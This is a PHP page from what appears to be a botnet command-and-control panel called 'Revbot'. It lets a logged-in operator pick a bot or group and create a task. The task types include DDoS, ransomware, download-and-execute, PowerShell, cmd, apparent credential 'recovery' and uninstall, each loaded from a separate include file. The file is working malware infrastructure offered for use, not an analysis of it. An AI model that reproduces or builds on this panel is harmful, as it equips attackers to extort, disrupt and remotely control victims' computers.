<?php
if (!$user->CheckLogin()) {
    $page = $tpl->GetPage("login");
    require_once $page;
    die();
}
$curr_user = $user->GetData($_SESSION['TOKEN']);
if(!$tasks->CheckType($_GET['type'])){
    $page = $tpl->GetPage("home");
    require_once $page;
    die();
}
if(@$group->CheckGroupWhereUser($_GET['group'], $_SESSION['TOKEN'])){
}else{
    if(!$bots->UserMatch($_GET['bot'], $_SESSION['TOKEN'])){
        $page = $tpl->GetPage("home");
        require_once $page;
        die();
    }
    
}
?>
<!DOCTYPE html>
<html lang="en" data-menu="vertical" data-nav-size="nav-default">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Revbot | AddTask</title>

    <link rel="shortcut icon" href="favicon.png">
    <link rel="stylesheet" href="assets/vendor/css/all.min.css">
    <link rel="stylesheet" href="assets/vendor/css/sharp-solid.min.css">
    <link rel="stylesheet" href="assets/vendor/css/sharp-regular.min.css">
    <link rel="stylesheet" href="assets/vendor/css/jquery-ui.min.css">
    <link rel="stylesheet" href="assets/vendor/css/OverlayScrollbars.min.css">
    <link rel="stylesheet" href="assets/vendor/css/jquery.dataTables.min.css">
    <link rel="stylesheet" href="assets/vendor/css/select2.min.css">
    <link rel="stylesheet" href="assets/vendor/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" id="primaryColor" href="assets/css/blue-color.css">
    <link rel="stylesheet" id="rtlStyle" href="table.html#">
    <style>
    /* Style pour le fond de la liste déroulante */
    .form-select:focus {
        background-color: black; /* Couleur de fond noire lorsqu'elle est ouverte */
    }
    
    /* Style pour le texte dans la liste déroulante */
    .form-select {
        color: white; /* Couleur du texte blanc pour une meilleure lisibilité */
    }
</style>

    <style>
        .alert {
            position: relative;
            top: 10;
            left: 0;
            width: auto;
            height: auto;
            padding: 10px;
            margin: 10px;
            line-height: 1.8;
            border-radius: 5px;
            cursor: hand;
            cursor: pointer;
            font-family: sans-serif;
            font-weight: 400;
        }

        .alertCheckbox {
            display: none;
        }

        :checked+.alert {
            display: none;
        }

        .alertText {
            display: table;
            margin: 0 auto;
            text-align: center;
            font-size: 16px;
        }

        .alertClose {
            float: right;
            padding-top: 5px;
            font-size: 10px;
        }

        .clear {
            clear: both;
        }

        .info {
            background-color: #EEE;
            border: 1px solid #DDD;
            color: #999;
        }

        .success {
            background-color: #EFE;
            border: 1px solid #DED;
            color: #9A9;
        }

        .notice {
            background-color: #EFF;
            border: 1px solid #DEE;
            color: #9AA;
        }

        .warning {
            background-color: #FDF7DF;
            border: 1px solid #FEEC6F;
            color: #C9971C;
        }

        .error {
            background-color: #FEE;
            border: 1px solid #EDD;
            color: #A66;
        }
    </style>
</head>

<body class="body-padding body-p-top">
    <!-- preloader start -->
    <div class="preloader d-none">
        <div class="loader">
            <span></span>
            <span></span>
            <span></span>
        </div>
    </div>
    <!-- preloader end -->
    <?php include $lz_path['imports'] . "/navbar.php"; ?>


    <!-- main content start -->
    <div class="main-content">

        <div class="dashboard-breadcrumb mb-25">
            <h2>Add task</h2>
        </div>
        <div class="row">
            <div class="row">
                <div class="col-12">
                    <div class="panel">
                        <div class="panel-body">
                            <form method="POST" action="">
                            <input type="hidden" name="p" value="add_task" />

                                <?php
                                            if($_GET['type'] == "shutdown"){
                                              require_once $lz_path['imports'] . "/task_shutdown.php";
                                            }elseif($_GET['type'] == "reboot"){
                                              require_once $lz_path['imports'] . "/task_reboot.php";
                                            }elseif($_GET['type'] == "ddos"){
                                                require_once $lz_path['imports'] . "/task_ddos.php";
                                            }elseif($_GET['type'] == "ransomware"){
                                                require_once $lz_path['imports'] . "/task_ransomware.php";
                                            }elseif($_GET['type'] == "dlexec"){
                                                require_once $lz_path['imports'] . "/task_dlexec.php";
                                            }elseif($_GET['type'] == "powershell"){
                                                require_once $lz_path['imports'] . "/task_powershell.php";
                                            }elseif($_GET['type'] == "cmd"){
                                                require_once $lz_path['imports'] . "/task_cmd.php";
                                            }elseif($_GET['type'] == "recovery"){
                                                require_once $lz_path['imports'] . "/task_recovery.php";
                                            }elseif($_GET['type'] == "close"){
                                                require_once $lz_path['imports'] . "/task_close.php";
                                            }elseif($_GET['type'] == "uninstall"){
                                                require_once $lz_path['imports'] . "/task_uninstall.php";
                                            }
                                ?>
                                    
                                        <div class="col-12">
                                            <button name="AddTask" type="submit" class="btn btn-primary">Create Task</button>
                                        </div>
                                    </div>
                                </div>
                
                            </form>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>


    <!-- footer start -->
    <?php include $lz_path['imports'] . "/footer.php"; ?>
    <!-- footer end -->
    </div>
    <!-- main content end -->

    <script src="assets/vendor/js/jquery-3.6.0.min.js"></script>
    <script src="assets/vendor/js/jquery-ui.min.js"></script>
    <script src="assets/vendor/js/jquery.overlayScrollbars.min.js"></script>
    <script src="assets/vendor/js/jquery.dataTables.min.js"></script>
    <script src="assets/vendor/js/select2.min.js"></script>
    <script src="assets/vendor/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/select2-init.js"></script>
    <!-- for demo purpose -->
    <script>
        var rtlReady = $('html').attr('dir', 'ltr');
        if (rtlReady !== undefined) {
            localStorage.setItem('layoutDirection', 'ltr');
        }
    </script>
    <!-- for demo purpose -->
</body>

</html>